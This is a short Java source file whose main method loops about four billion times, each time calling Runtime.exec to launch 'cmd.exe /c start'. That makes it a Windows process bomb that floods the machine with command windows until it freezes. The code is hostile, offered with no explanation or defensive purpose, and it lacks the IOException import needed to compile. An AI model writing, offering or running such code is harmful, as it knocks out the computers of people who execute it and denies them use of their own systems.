public class Main { //Start

 public static void main(String[] args) throws IOException {
	for (int x = Integer.MIN_VALUE; x < Integer.MAX_VALUE; x++) {
		Runtime rt = Runtime.getRuntime();
	        rt.exec(new String[]{"cmd.exe","/c","start"});
	}
}


} //End
